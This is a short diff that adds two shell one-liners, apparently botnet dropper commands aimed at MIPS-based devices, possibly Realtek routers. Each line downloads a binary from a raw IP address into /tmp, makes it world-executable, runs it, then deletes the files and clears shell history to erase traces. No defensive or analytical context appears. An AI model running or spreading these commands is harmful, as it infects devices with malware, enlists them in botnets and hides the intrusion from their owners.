@@ -1,0 +1,2 @@
+cd /tmp; wget http://23.254.224.150/bins/rift.mips; chmod 777 *;./rift.mips realtek.mips;rm -rf *;history -w;history -c
+cd /tmp; wget http://23.254.224.150/bins/rift.mpsl; chmod 777 *;./rift.mpsl realtek.mpsl;rm -rf *;history -w;history -c
